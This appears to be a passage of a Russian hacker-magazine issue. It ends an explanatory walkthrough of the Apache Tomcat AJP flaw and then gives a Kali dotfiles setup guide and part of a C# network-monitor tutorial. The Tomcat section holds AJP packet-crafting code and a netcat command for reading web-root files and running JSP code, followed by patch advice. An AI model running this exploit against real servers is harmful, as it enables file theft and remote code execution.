attr_code = struct.pack("b", 0x0a) # SC_A_REQ_ATTRIBUTE
for n, v in attributes.items():
    data += attr_code
    data += pack_string(n)
    data += pack_string(v)
data += end # packet terminator byte 0xff

Дальше посчитаем длину получившегося запроса и запишем ее в заголовок
после магической константы.


ajp-packet.py
header = struct.pack(">hH", magic, len(data))

Соединяем заголо вок пакета и тело. Полученный результат выводим в виде
hex‐строки.


ajp-packet.py
request = header + data
print(request.hex())

Для отправки буду использовать стандартный netcat, а hex‐строку преобра‐
зовывать в бинарные данные с помощью xxd.


python3 ajp‐packet.py | xxd ‐r ‐p | nc tomcatrce.vh 8009

Отправляем пакет и в отладчике видим, что мы попали в нужную ветку кода.





                 AJP‐пакет с добавленными атрибутами

Благодаря javax.servlet.include.path_info путь до файла стал /WEB‐
INF/web.xml вместо указанного в request_uri /anything.





   Путь запрашиваемого файла сформировался из атри бутов AJP‐запроса

Именно этот файл и будет прочитан менеджером ресурсов.





   Чтение файла /ROOT/WEB‐INF/web.xml через атрибуты в AJP‐запросе

Вот так мы незаметно проэкс плуатировали ошиб ку чте ния произвольного
файла (Arbitrary File Read) на сервере. К сожалению, выйти из директории we‐
bapps не получится, так как путь проходит санитизацию при помощи normal‐
ize, который вызывается из метода validate.


/tomcat9.0.30/java/org/apache/catalina/webresources/Standard-
Root.java
private String validate(String path) {
    ...
    if (path == null || path.length() == 0 || !path.startsWith("/"))
{
        ...
        result = RequestUtil.normalize(path, false);
        ...
    if (result == null || result.length() == 0 || !result.startsWith(
"/")) {
        throw new IllegalArgumentException(
                sm.getString("standardRoot.invalidPathNormal", path,
result));

Так что для чтения доступны файлы, которые находятся внутри веб‐рута, app‐
base в конфиге.


/tomcat9.0.30/conf/server.xml
<Host name="localhost"  appBase="webapps" unpackWARs="true" autoDe
ploy="true">

Готовый скрипт для тестирования можно ска чать c моего Гитхаба.
  Но это не единственная проблема, которую вызывает манипулирование
атрибутами запроса.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
        КОТ- ПРИЗРАК
                 КАК ЭКСПЛУАТИРОВАТЬ НОВУЮ RCE‐
                                УЯЗВИМОСТЬ
                  В ВЕБ‐СЕРВЕРЕ APACHE TOMCAT





ВЫПОЛНЕНИЕ ПРОИЗВОЛЬНОГО КОДА
Как я уже говорил, вся статика обрабатывается при помощи DefaultServlet.
А что с динамическими страница ми? Tomcat поддерживает JavaServer Pages
(JSP), за обработку которых отвечает JspServlet.


/tomcat9.0.30/java/org/apache/jasper/servlet/JspServlet.java
public class JspServlet extends HttpServlet implements Period
icEventListener {

А вызывается он в тех случаях, когда запрос отправляется на файлы, попада‐
ющие под маску *.jsp и *.jspx.


/tomcat9.0.30/conf/web.xml
<servlet>
    <servlet‐name>jsp</servlet‐name>
    <servlet‐class>org.apache.jasper.servlet.JspServlet</
servlet‐class>
    ...
<servlet‐mapping>
    <servlet‐name>jsp</servlet‐name>
    <url‐pattern>*.jsp</url‐pattern>
    <url‐pattern>*.jspx</url‐pattern>

Выбор того, какой класс будет обра баты вать зап рос, делается на основе URI:
если я запрашиваю файл /anything.jsp, то обра баты вать запрос будет
JspServlet. Посмотрим, как здесь формиру ется путь до файла.


/tomcat9.0.30/java/org/apache/jasper/servlet/JspServlet.java
public void service (HttpServletRequest request, HttpServletResponse
response)
    ...
    if (jspUri == null) {
        ...
        jspUri = (String) request.getAttribute(
                RequestDispatcher.INCLUDE_SERVLET_PATH);
        if (jspUri != null) {
            ...
            String pathInfo = (String) request.getAttribute(
                    RequestDispatcher.INCLUDE_PATH_INFO);
            if (pathInfo != null) {
                jspUri += pathInfo;
            }
        }

А здесь все то же самое: если присутству ют атрибуты, то путь формиру ется
на их основе. То есть если я отправлю запрос на любой файл (даже несущес‐
твующий) с расширением .jsp или .jspx, а затем при помощи javax.servlet.
include.path_info поменяю путь на другой файл — он будет интерпретиро‐
ван и обработан как JavaServer Pages.
  Создадим файл test.txt в директории ROOT.


/ROOT/test.txt
<% out.print("Hello from JSP compiler!"); %>

Внесем необходимые изменения в наш скрипт.


ajp-packet.py
req_uri = pack_string("/anything.jsp")
    ...
    'javax.servlet.include.path_info': '/test.txt',

И снова отправим получившийся зап рос. Параметр jspUri будет сфор‐
мирован из атрибутов, и получится, что он указыва ет на текстовый файл. Тем
не менее он передается на исполнение как JSP в serviceJspFile.


/tomcat9.0.30/java/org/apache/jasper/servlet/JspServlet.java
public void service (HttpServletRequest request, HttpServletResponse
response)
    ...
    serviceJspFile(request, response, jspUri, precompile);





        Интерпретируем обычный тексто вый файл как скрипт JSP

JSP‐код успешно выполнился, так что можно использовать любой пейлоад
для выполнения системных команд.
  С тем, чтобы доставить файл с нужным пейлоадом на сервер, проблем, я
думаю, не возникнет. Вспомни, когда ты пос ледний раз видел приложение
без возможности загрузки файлов (картинок, например)? Загрузить картинку
с нужным кодом внутри не составляет никакого тру да.
  На просторах интернета ты найдешь множес тво скриптов, автомати зиру‐
ющих эту атаку. Вот, нап ример, модуль AJPy для Python, в котором реали‐
зована возможность эксплуата ции уяз вимос ти.


ДЕМОНСТРАЦИЯ УЯЗВИМОСТИ (ВИДЕО)





ЗАКЛЮЧЕНИЕ
Рассмотренная уязвимость отлично демонс трирует, как небольшой мис‐
конфиг может быть опасен для всего окру жения. Рекомендую внимательно
относиться к настрой ке каж дого объекта в инфраструктуре и отключать неис‐
пользуемые функции и протоколы, чтобы минимизировать потенциальные
точки входа для злоумышленников.
   Уязвимость была оперативно исправлена в новых версиях Apache Tomcat,
так что обновляйся на 9.0.31, 8.5.51 и 7.0.100, в зависимости от исполь‐
зуемой ветки приложения. Если на данный момент нет такой возможности, то
отключи использование про токола AJP.


/conf/server.xml.old
<!‐‐ Define an AJP 1.3 Connector on port 8009 ‐‐>
<Connector port="8009" protocol="AJP/1.3" redirectPort="8443" />


/conf/server.xml
<!‐‐ Define an AJP 1.3 Connector on port 8009 ‐‐>
<!‐‐ <Connector port="8009" protocol="AJP/1.3" redirectPort="8443" /
> ‐‐!>

Ну а если этот протокол используется в работе, то ставь патчи для своей вер‐
сии (7.x, 8.x, 9.x).
ТРЮКИ
   РУЛИМ
 ДОТФАЙЛАМИ
        КАК БЫСТРО ПОВЫСИТЬ
      КОМФОРТ В ЛЮБОМ LINUX
            ИЛИ WSL





                                              snovvcrash
                                             Безопасник, временами
                                              питонщик, местами
                                              криптоана(рхист)литик, по
                                         необходимости системный
                                               администратор
                                              snovvcrash@protonmail.ch





Мне часто приходится разворачивать свою рабочую среду (в
частности, Kali Linux) на новых машинах: то на железе, то
на виртуалках, то снова на железе... В какой‐то момент мне
надоели рутинные действия, и я решил извлечь из этой ситу‐
ации максимальную пользу для себя и окружающих. В этой
статье поговорим о том, как можно организовать хранение
своих дотфайлов,  чтобы более‐менее автоматизировать
настройку и персонализацию  различных ОС  для дома
и работы.


.ФАЙЛЫ
Помнится, как‐то я прочитал статью, которая про извела на меня сильное впе‐
чатление. Речь там шла немного не о том, о чем поговорим сегодня мы, одна‐
ко главная идея та же: большинство системных ути лит используют стандар‐
тные пути для хранения своих конфигурационных файлов, поэтому совсем
несложно создать персонализированную кол лекцию настроек для разных
программ и восстанавливать их от одно го деплоя операционной системы
к другому.
   Эта концепция стара как мир и носит наз вание «дотфайлы» — файлы, наз‐
вания которых начинаются с точки, а так как большинство конфигов в никсах
и правда начинаются с точки (чтобы стать скрытыми и не мозолить глаза юзе‐
ру в выводе ls), то все вполне логично.
   Удобнее все го, на мой взгляд, организовать хра нение дотфайлов в сис‐
теме управления версиями (CVS), чтобы можно было клонировать репози‐
торий одним действием при настройке новой системы. Однако это нак‐
ладывает определен ные условия на то, чт смогут содержать твои конфиги,
так как нельзя забывать, что CVS — шту ка пуб личная.
  Приватными репозиториями пользовать ся бессмысленно — это убьет все
преимущества такой организации дотфайлов: например, их не повытаскива‐
ешь из скриптов по отдельности без токенов авто ризации. Кто‐то может
использовать облака для более удоб ной синхронизации, чтобы избе жать
миллионов пушей по каждой мелочи. В любом случае это вопрос вкуса, и в
этой статье я покажу один из спо собов, как можно хранить свои настройки
на GitHub.
   Итак, у меня есть два репозитория.
  Первый — dotﬁles‐linux — конфигурацион ные файлы для приложе ний
на Linux.





              Ветки master и wsl репозитория dotﬁles‐linux

Второй — dotﬁles‐windows — конфигурацион ные файлы для приложе ний
на Windows.





               Ветка master репозитория dotﬁles‐windows

В первом репозитории две ветки: master и wsl. Ветка wsl отвечает за версии
дотфайлов, которые я использую во втором репозитории для персонали‐
зации Windows Subsystem for Linux. Когда при нас трой ке винды я заметил, что
никсовые конфиги не получается юзать для WSL «в чис том виде», то решил
вести отдельную ветку, которую позже включил в dotfiles‐windows в качес‐
тве подмодуля.
  Результат такой: когда я раз ворачиваю дотфайлы на новой сис теме с Win‐
dows, я должен выполнить изнутри WSL следующие команды.



  ~$ WIN_DOTFILES_DIR="$(wslpathcmd.exe /C "echo %USERPROFILE%" | tr ‐d
  "\r")/.dotfiles"


Первым действием с помощью wslpath, который резол вит пути между хос‐
товой ОС и WSL, я создаю переменную с именем директории, куда я кло‐
нирую репозиторий с моими дотфайлами для Windows. В моем случае дирек‐
тория будет называться /mnt/c/Users/snovvcrash/.dotfiles.



  ~$ git clone https://github.com/snovvcrash/dotfiles‐windows "${WIN_DOT‐
  FILES_DIR}"


Далее я выкачиваю dotfiles‐windows по этому пути.



  ~$ ln ‐sv "${WIN_DOTFILES_DIR}/wsl" ~/.dotfiles


Последним действием я создаю символическую ссылку в файловой системе
WSL. Она будет указывать на подмодуль /mnt/c/Users/snovvcrash/.dot‐
files/wsl, который мы заберем с гита, как показа но ниже.



  /mnt/c/Users/snovvcrash/.dotfiles$ git submodule update ‐‐init ‐‐remote
  /mnt/c/Users/snovvcrash/.dotfiles$ git submodule foreach "git checkout
  $(git config ‐f $toplevel/.gitmodules submodule.$name.branch || echo
  master)"


Здесь я инициализирую git‐подмодуль для данного репозитория на осно‐
вании настроек .gitmodules, а потом восста навливаю стейт detached HEAD
для всех подгрузив шихся подмодулей, так как по дефол ту они выкачиваются с
отваленными головами.
   Если интересно настро ить такую же схему, как у меня, это можно сделать
с помощью одной команды, которая добавит подмодуль wsl в твой репози‐
торий дотфайлов из существу ющего ремоута.



  /mnt/c/Users/snovvcrash/.dotfiles$ git submodule add https://github.com/
  snovvcrash/dotfiles‐linux wsl


Результат такой же, как если бы я вручную изменил конфиг .gitmodules
с помощью git config.



  /mnt/c/Users/snovvcrash/.dotfiles$ git config ‐f .gitmodules submodule.
  wsl.branch wsl


Про концепцию хранения дотфайлов поговорили, а что же, собственно, мож‐
но в них хранить? Я остановлюсь только на нес коль ких тулзах, которы ми пос‐
тоянно пользуюсь в Linux: описание всего, что там лежит, может растянуться
на долгие часы.


ZSH
С какого‐то момента я перес тал вос принимать Bash как шелл, в котором
можно комфортно работать. Да, разумеется, если жизнь зас тавит (особенно
если это реверс‐коннект с машины‐жертвы), можно юзать и обычный /bin/sh
без  автодополнения,  истории  и  управляющих  символов.  Но  даже
реверс‐шелл можно довести до ума, про апгрейдив его до PTY, чего уж
говорить о дефолтной оболочке на своей машине. Поэтому я использую Zsh.
Не писал о нем только ленивый, так что сра зу перейдем к минимальному
набору приятностей, нужных, чтобы удобно с ним сущес твовать.


Oh My Zsh
В первую очередь это, конечно же, фрей мворк Oh My Zsh, позволяющий
играючи управлять дополнениями и плагина ми Zsh. Маст‐хэвом я считаю zsh‐
syntax‐highlighting для подсветки синтаксиса команд в терминале и zsh‐auto‐
suggestions для предложения автозавершения команд на основе твоей исто‐
рии. Установка сводится к выполнению трех прос тых дей ствий, после которых
нужно перелогиниться, чтобы изменения возымели эффект.



  $ apt install zsh ‐y && sh ‐c "$(curl ‐fsSL https://raw.githubusercon‐
  tent.com/robbyrussell/oh‐my‐zsh/master/tools/install.sh)"
  $ git clone https://github.com/zsh‐users/zsh‐syntax‐highlighting.git ${
  ZSH_CUSTOM:‐~/.oh‐my‐zsh/custom}/plugins/zsh‐syntax‐highlighting
  $ git clone https://github.com/zsh‐users/zsh‐autosuggestions ${ZSH_CUS‐
  TOM:‐~/.oh‐my‐zsh/custom}/plugins/zsh‐autosuggestions
  $ sed ‐i 's/plugins=(git)/plugins=(git zsh‐syntax‐highlighting zsh‐auto‐
  suggestions)/g' ~/.zshrc



Про темы и промпт темы robbyrussell
Zsh не Zsh без цветастого промпта, одна ко большая часть кастомных тем
слишком нагружает интерпретатор, и появляется  input  lag. Чтобы этого
не было, я использую дефолтную тему с одним изменением: ту часть промпта,
в которой отражается текущая рабочая директория, я настроил так, чтобы она
отражала две родительские папки «назад» и корень, потому что по умолчанию
тема robbyrussell показывает только одну папку. Таким образом ты
не допустишь засорения экра на при работе в «длинной» директории, но всег‐
да будешь в курсе, где сейчас находишься.



  $ cp "$ZSH/themes/robbyrussell.zsh‐theme" "$ZSH_CUSTOM/themes/robbyrus‐
  sell.zsh‐theme"
  $ echo '[*] replace "%c" with "%(4~|%‐1~/…/%2~|%3~)" in "$ZSH_CUSTOM/
  themes/robbyrussell.zsh‐theme"'


Теперь если заменить %c на %(4~|%‐1~/…/%2~|%3~) в файле $ZSH_CUSTOM/
themes/robbyrussell.zsh‐theme, то все будет по плану.





       Дефолтный vs модифицированный промпт темы robbyrussell


Source it!
Последним действием я добавляю настройки source внешних дотфайлов,
которые лежат в папке ~/.dotﬁles/system, в конфиг .zshrc.


# ~/.zshrc
...
# Resolve DOTFILES_DIR
if [ ‐d "$HOME/.dotfiles" ]; then
    DOTFILES_DIR="$HOME/.dotfiles"
else
    echo "Unable to find dotfiles, exiting..."
    return
fi
# Source dotfiles
for DOTFILE in "$DOTFILES_DIR"/system/.*; do
    [ ‐f "$DOTFILE" ] && . "$DOTFILE"
done

Там в основном определены дополнитель ные переменные для экспорта, сис‐
темные алиасы, настройки виртуальных сред (для Python) и тому подобное.


TMUX
Я большой фанат tmux. Это и правда очень удоб ная штука, которая помогает
оставаться организованным при одновременной работе с нес колькими сес‐
сиями. Для настройки tmux тоже есть туча опций, как и для практически любой
линуксовой утилиты.
  На мой сетап можно посмотреть на GitHub, а вживую он выглядит пример‐
но так.





                     Tmux на терминале WSLtty

Из необычного здесь только панель в пра вом нижнем углу, на которой висят
мониторы системных ресурсов. Уста навливается она отдельно, поэтому я
свел процесс настройки tmux в небольшой скрипт (предполагается, что
директория .dotfiles со всем необ ходимым уже существу ет в твоем домаш‐
нем каталоге).


#!/usr/bin/env bash
sudo apt install wget git xclip ‐y
rm ‐rf ${HOME}/.tmux*
git clone "https://github.com/tmux‐plugins/tpm" ${HOME}/.tmux/
plugins/tpm
ln ‐sv ${HOME}/.dotfiles/tmux/.tmux.conf ${HOME}/.tmux.conf
git clone "https://github.com/thewtex/tmux‐mem‐cpu‐load" ${HOME}/.
tmux/plugins/tmux‐mem‐cpu‐load
cd ${HOME}/.tmux/plugins/tmux‐mem‐cpu‐load
cmake .
make
sudo make install
cd ‐


TILIX
Если ты так же, как и я, влюбишь ся в tmux, то тебе понадобится минималис‐
тичный терминальный эмулятор, не перегруженный лишними фичами вроде
создания новых вкладок, хоткеев на copy‐paste (так как в tmux у нас все свое)
и странной реак ции на нажатие правой кноп ки мыши. С этим проблематич‐
нее, так как практически все, что я пробовал, уже было заточено под «свою
атмосферу», где «тмуксу» были не слиш ком рады. В итоге я остановился
на Tilix для Linux и WSLtty для WSL.
     Tilix в конфигурации «из коробки» не попада ет под определение минима‐
листичного терминала, одна ко в отличие от дру гих терминалов все его
навороты (автодопол нение, панели, верхние менюшки) можно отключить
в настройках. В итоге я остановился на голом окне без рамок с эффектом
прозрачности и пол ностью доволен результатом.





                       Tmux на терминале Tilix


st
Был период, когда я эксперимен тировал с фор ком st, но как‐то не срос лось.
Может, сам он и ультра минималистичный, но вот только для него нужно пос‐
тавить немало зависимос тей, которых ко всему про чему может не оказаться
в дефолтном репозитории. Пробный конфиг вмес те со скриптом для сборки
можно найти здесь.



ЛАЙФХАКИ ПО НАСТРОЙКЕ KALI
Когда делаешь что‐то с завидной регулярностью, то волей‐неволей выраба‐
тываешь для себя методику, которой ста раешь ся придерживаться в даль‐
нейшем. Вот мои рутинные действия при уста новке Kali, как в слу чае с уста‐
новкой на ВМ, так и на железо.
  Первое. Если ставим на ВМ: отключить систему управления питанием,
чтобы машина не уходила в сон и не лочила экран. Для меня это обязательная
опция, потому что часто работаешь с активной Kali на фоне.
  Вто рое. Если ставим на ВМ: настро ить парал лельную работу сетевых
интерфейсов. Обыч но у меня включены три сетки на виртуал ке (в терминах
VirtualBox): NAT, внутренняя сеть и виртуальный адаптер хоста.
  С заводскими настройками Kali не позволяет использовать все коннекты
одновременно — NetworkManager не разрешает. Однако если делегировать
полномочия управления сетью на  ста рин ный ifconfig,  то обеспечить
одновременную работу сетевых интерфей сов можно, задав соответс твующие
настройки в /etc/network/interfaces.


$ cat /etc/network/interfaces
# This file describes the network interfaces available on your system
# and how to activate them. For more information, see interfaces(5).


source /etc/network/interfaces.d/*


# NAT
allow‐hotplug eth0
iface eth0 inet dhcp


# Internal
allow‐hotplug eth1
iface eth1 inet dhcp


# Host‐only
allow‐hotplug eth2
iface eth2 inet dhcp


# The loopback network interface
auto lo
iface lo inet loopback

После этого поднимаем каждый из указанных интерфейсов, and we’re good
to go!



  $ ifup eth0
  $ ifup eth1
  $ ifup eth2


В теории это можно сделать через нас тройку сетевых профилей для Network‐
Manager, но я привык по старин ке.
   Третье.  Обновляем  систему.  Если  виртуал ка  установлена  у  тебя
на рабочей машине, включенной в домен, и ты не можешь выключить антивир
на период обновле ний (ибо политика не разрешает), то настоятельно
рекомендую вытягивать апдейты по HTTPS, что бы не стриггерить 9999 алер‐
тов со стороны хоста. Для это го достаточно добавить букву s в http в файле
/etc/apt/sources.list.



  $ sudo vi /etc/apt/sources.list
  ...Переходим на HTTPS по необходимости...
  $ sudo apt update && sudo upgrade ‐y
  $ sudo reboot


Четвертое. На ВМ ставим Guest Additions только тогда, когда что‐то из его
фич не работает: нативное разрешение не подтягива ется либо не действует
drag’n’drop или общий буфер обмена. В противном слу чае оставляем все
как есть, потому что обычно готовые образы содержат пре дустановленные
гостевые дополнения, которые, в свою очередь, очень хрупкие и ломаются
от любого чиха.
  Пятое. Решаем, под каким пользователем будем работать. С правами
рута жить проще, но намного опаснее, поэтому рекомендую все же отказать‐
ся от суперъюзера хотя бы в том случае, если  Kali была установлена
на железо. Однако, признать ся честно, на виртуал ках я продол жаю работать
с повышенными привилегиями, так что на этом эта пе я задаю пароль для root
и отклю чаю дефол тного юзера kali.



  kali@kali:$ sudo ‐i
  kali@kali:$ passwd root
  ...Перелогиниваемся как root...
  root@kali:$ usermod ‐L kali && usermod ‐s /sbin/nologin kali && chage ‐
  E0 kali


Шестое. Если работаешь под обычным юзером, можно продлить время
тайм‐аута на ввод пароля для sudo. Опционально и может быть кем‐то рас‐
ценено как небезопасная нас тройка, поэтому здесь на твое усмотрение.



  $ sudo visudo
  ...
  Defaults    env_reset,timestamp_timeout=45
  ...


Седьмое. Устанавливаем cmake, так как он понадо бится для сборки софта,
и дергаем свои конфиги с GitHub.



  $ sudo apt install cmake ‐y
  $ git clone https://github.com/snovvcrash/dotfiles‐linux ~/.dotfiles


После всего это го можно быстро нас троить то, что было описано выше,
и идти вершить великие дела. Что бы не вбивать команды по одной, я наб‐
росал несколько тематичес ких скриптов, которые выпол нят необходимые
установки.
ТРЮКИ

 НИ ЕДИНОГО
  РАЗРЫВА
       ПИШЕМ НА C# УТИЛИТУ
       ДЛЯ МОНИТОРИНГА СЕТИ





                                              Hackcat
                                             hackcat.dev@gmail.com





Если тебе надоели постоян ные обрывы связи и косяки про‐
вайдера, но субъективные оценки типа «подвисает» не вну‐
шают доверия, лучший выбор — записать состояние сети
в автоматичес ком режиме. Причем для этого необязательно
гонять Nagios, который к тому же не так прост в настрой ке.
Сегодня мы напишем утилиту для мониторинга сети, которая
легко нас траивается и сохраняет в журнал RTT до задан ных
хостов, packet loss и скорость соединения (опциональ но),
а логи летят прямо в Telegram.


Виновником появления этой статьи стал уже несколько месяцев сбоящий
интернет, который мне предоставляет единс твенный в округе провайдер.
Увы, в мою деревню ничего, кроме ADSL, не завез ли, и, судя по качес тву свя‐
зи, и тот не дошел без многочисленных скруток. Packet loss порой доходит
до 60–70%, что уже ни в какие ворота не лезет. Поэтому я решил сам изме‐
рить качество связи, дабы ткнуть провай деру под нос логи вмес те с заяв‐
лением о расторжении договора.


ЗАДАЧИ
Наша цель — написать прос той сетевой монитор, чтобы в фоновом режиме
отслеживать главные показа тели в сети и сохранять их для анализа. Думаю,
сбора следующих парамет ров хва тит с головой, а если тебе понадобится
что‐то еще, всегда можно добавить (не забудь расска зать об этом мне).
 • Пинг для задан ных хостов. Прос то маст‐хэв для любой диагностичес‐
   кой утилиты. Измеряя пинг, можно узнать также и процент потерь пакетов
   (packet loss), и коды ошибок, позволяющие выяснить, что именно не так
   с сетью. Например, Destination Prohibited означает, что сеть вроде
   и есть, но администра тор какого‐то из промежуточных устройств не про‐
   пускает пакет. В общем, ана лизировать ста тус‐коды отве тов обязательно.
 • Ре альная воз можность под ключений по TCP. Возможна ситу ация,
   когда хосты вроде живы и откликаются на пинг, DNS работает, а дос туп
   в интернет закрыт за неоплату. Этот тест потенциально поз волит нам
   выявить недобросовес тного провайдера, который под делывает ответы
   на пинги, но не обеспечивает реальный коннект.
 • Уве домления о вре мени даун тайма в Telegram. Они должны
   отправляться,  как  только  соединение  вос становится.  Сообщение
   по‐хорошему дол жно включать расширенную инфу о пинге и потерях
   пакетов после сбоя, а также состояние HTTP‐клиента.
 • Доступ к роуте ру. Для домашней сети с нес табильным Wi‐Fi это осо‐
   бенно актуально. Роутер может просто упасть от перегрузки (например,
   очередной школохакер ломится на дырявый WPS, но вмес то взлома
   получается DoS) или попросту не выдержать всех клиентов, которых
   в ином «умном доме» может быть и 15, и 20. Короче, роутер в любой
  момент может уйти в перезагрузку, а мы будем грешить на провайдера.
   Это нехорошо, поэто му при потере связи с роутером мы не будем тес‐
   тировать дальше, а просто подождем, пока починят.

Цели обрисованы. Теперь детали реализации.
 • Программа предназначена для длительной работы в фоновом режиме.
  Оформим программу как системный сервис Windows.
 • Если мы работаем в фоновом режиме, ни консоль ный интерфейс, ни тем
   более GUI нам не нужен. Тем лучше — мень ше кода.
 • Проверки не дол жны силь но нагружать канал, ведь будет некомфортно
   работать. Так что пос тоянно флудить пингами мы не станем. Отправим
   очередь из десятка пакетов раз в минуту‐две, и хватит. Реже отправлять
   не имеет смысла — большинс тво неполадок устраняются в течение нес‐
   кольких минут, а мы хотим знать о каждом сбое.
 • Возможность хранить отчет в JSON и выгружать CSV для изучения
   в Excel — с фильтрацией по дате создания.
 • Неплохо бы прик рутить возможность забирать логи по сети и скидывать
   статистику на центральный сервер, но в рамках демо я этого делать
   не буду.

Из этого следует, что нам понадобится работа с JSON. Писать я буду на C#
и воспользуюсь модулем Json.NET.


        WWW

                       Json.NET — популяр ная и простая библиотека
                       для работы с JSON. Скачать ее можно с NuGet,
                       а примеры использования лежат на сайте про‐
                         екта.





                                     Продолжение статьи →
ТРЮКИ               ← НАЧАЛО СТАТЬИ

НИ ЕДИНОГО РАЗРЫВА
                      ПИШЕМ НА C# УТИЛИТУ
                       ДЛЯ МОНИТОРИНГА СЕТИ





КОДИМ
Для начала скачай Visual Studio с сайта Microsoft, если у тебя ее еще нет. Нуж‐
на поддержка языка C# и NuGet (с вкладки «Дополнительные компоненты»).
  Первым делом создаем новый проект типа «Консольное приложение».
Можно было, конечно, реализовать его в качес тве «Службы Windows», тогда
не нужно было бы городить кос тыли для регистрации нашего монитора
как системной службы. Бонусом получили бы автозапуск. Жаль, что в случае
«шаблонного» сервиса мы теря ем ту гиб кость и управляемость, что имеем
при ручном управлении.





     Тип проекта «Служба Windows», если решишь им воспользоваться

Готово. Теперь — алгоритм. Алгоритм работы программы будет прост.
Во‐первых, нужно прочитать настройки. Они у нас будут в файле JSON рядом
с исполняемым файлом. Во‐вторых, надо соз дать и запустить таймер, чтобы
неожиданные задержки канала не мешали нам про изводить замеры через
равные промежутки времени. И в‐третьих, надо написать код сохранения
результатов замеров. Поеха ли!
  Сперва опре делим, что именно мы сможем настраивать. Я выбрал сле‐
дующие параметры:
 • хост и порт, до которых будет про ходить проверка работоспособности
   HTTP;
 • количество пакетов пинга и их тайм‐аут;
 • задержка перед отправлением следующего пакета пинга;
 • задержка между соседними измерениями (та, которая определяет, раз
   в сколько минут проверка);
 • вклю чить или выключить вывод сооб щений в консоль (для отладки);
 • хосты, которые будем пинговать;
 • IP роутера (чтобы узнавать, не завис ли он). Ты спросишь, зачем отдельно
   IP роутера, если его можно ука зать в общем спис ке адре сов для проверки,
   и будешь прав. Разница в том, что, если программа не обнаружит связи
   с роуте ром, остальные хос ты проверяться не будут, чтобы не тратить
   ресурсы;
 • тайм‐аут для подключения по HTTP;
 • максимальный уровень packet loss, при котором под ключение считается
   нормальным. Мне пришлось пос тавить себе 10%, так как 5–7% совсем
   не редкость для моей деревни;
 • выходной формат строки для CSV, если ты вдруг решишь отключить вывод
   ненужных столбцов. Признаюсь, я уже забыл, зачем мне это понадо‐
   билось;
 • выходной файл CSV, в который будут дописываться результаты;
 • возможность отключить запись.


static String       HTTP_TEST_HOST;
static int          HTTP_TEST_PORT;
static int          HTTP_TIMEOUT;
static int          PING_COUNT;
static int          PING_DELAY;
static int          PING_TIMEOUT;
static List<String> PING_HOSTS;
static int          MEASURE_DELAY;
static String       ROUTER_IP;
static bool         CUI_ENABLED;
static double       MAX_PKT_LOSS;
static String       OUT_FILE;
static bool         WRITE_CSV;
static String       CSV_PATTERN;
static String       TG_TOKEN;
static String       TG_CHAT_ID;
static bool         TG_NOTIFY;

Думаю, нет смысла расписывать, какая переменная за что отве чает, я пос‐
тарал ся дать им понятные названия. Если что, можешь прочитать коммента‐
рии к коду (ссылка на GitHub — в конце статьи).
  С настройками разоб рались, теперь добавим их загрузку. Тут все прос то:
читаем  файл,  скармливаем  его  Json.NET,  рас кладываем  настройки
по переменным.





                        Заг ружа ем нас трой ки

Теперь позаботимся о выводе CSV. Пос кольку стро ка в конфиге задает толь‐
ко шаблон вывода, заголовки столбцов нам придется наз начить самос‐
тоятельно. А так как мы хотим знать и результаты измерений по каждому хосту
из списка, нужен цикл. Ниже — часть кода, которая отвечает за формирова‐
ние заголов ка таблицы.


String CSV_HEADER = CSV_PATTERN
    .Replace("FTIME", "Snapshot time")
    .Replace("IUP", "Internet up")
    .Replace("AVGRTT", "Average ping (ms)")
    .Replace("ROUTERRTT", "Ping to router (ms)")
    .Replace("LOSS", "Packet loss, %")
    .Replace("MID", "Measure ID")
    .Replace("SEQ", "SeqID")
    .Replace("HTTP", "HTTP OK")
    .Replace("STIME", "STime");
foreach (var host in PING_HOSTS) {
     CSV_HEADER = CSV_HEADER.Replace("RN", $"RTT to {host};RN");
}
CSV_HEADER = CSV_HEADER.Replace("RN", ";;\r\n");

Теперь небольшое пояснение, что тут происходит. Сначала мы заменяем
почти все идентификаторы в строке формата на их человекочитаемые зна‐
чения. Почти — потому что RN, обознача ющий конец строки, остается. Далее
в цикле мы вот таким нехитрым образом дописываем новые столбцы, а под
конец закрываем строку с помощью ;;\r\n и убираем RN.





               Парсим аргументы и выводим справку

С этим кодом и так все понят но: парсим аргу менты, если их нет — выводим
справку. Программа знает четыре режима работы.
 1. При запуске без аргу ментов. Просто выводит справку и ждет, когда поль‐
   зователь ее прочитает.
 2. Запуск с d или daemon. Программа запус кается и работает в фоновом
   режиме, никуда не уста навливаясь.
 3. Запуск с m или measureonce. Прог рамма также не будет регистри‐
   ровать сервис, но и прятать окно не будет, в отличие от второго режима.
  Просто для запуска пор тативной измерялки с флешки.
 4. Режим установки. Войти в него можно с помощью параметров i или 
  install. В этом случае будет зарегистри рован сервис, а программа
   перезапустится как сервис в режиме 2.

Обработка  этой несложной  логики представлена на скриншоте выше.
На этом подготовительная часть завершена, делаем логику измерений.
  Для сохранения резуль татов мы догово рились использовать JSON. А в
.NET можно без проб лем сериализовать в него классы и структуры. Каждый
снапшот состояния сети содержит немало информации, так что давай объ‐
явим класс для хранения результата измерения, а еще лучше — структуру,
поскольку класс использует больше ресурсов, а вся его гибкость нам не нуж‐
на. В итоге структура, хра нящая результат измерения, выглядит вот так:


struct net_state {
    public bool inet_ok;
    public bool http_ok;
    public Dictionary<String,int> avg_rtts;
    public double packet_loss;
    public DateTime measure_time;
    public int router_rtt;
    public long measure_id;
}

Флаг inet_ok определяет, удовлетво рительное ли состояние сети при этом
измерении, согласно нас тройкам из конфига. Здесь будет false, если про‐
вален хотя бы один из тес тов: тест HTTP, средний пинг до всех хостов боль‐
ше 0,75 тайм‐аута, packet loss больше максималь но допустимого или роутер
ушел в офлайн.
  Флаг http_ok определяет успех теста HTTP‐клиента. Если здесь true, то
соединение  действительно можно  уста новить. Но  хитрые провайдеры
при неуплате могут под делывать тра фик HTTP для перенаправления на свою
страницу, что следует иметь в виду, если пинги не проходят, а HTTP говорит,
что все в норме.
   Дальше мы видим сло варь avg_rtts, в котором указаны сред ние пинги
до каждого хоста из списка. Адрес хос та здесь слу жит ключом, а средний
результат — значением; packet_loss показывает сред нюю потерю пакетов
на всех хостах.
   Тут мы видим небольшой недостаток схемы: программа должна померить
пинг до каждого хоста из списка (пусть их будет пять), но, если мы хотим
отправить каждому десять пакетов с тайм‐аутом 3 секунды, а ни один не дос‐
тупен, на все замеры уйдет 5 × 10 × 3 = 150 секунд, что больше двух минут
между первым и последним измерением.
  Да и мы усло вились замерять каж дую минуту, так что такую длительность
замера позволить нель зя. Если три подряд пакета превысили тайм‐аут
или вернулся Destination Prohibited или No such host хотя бы однажды,
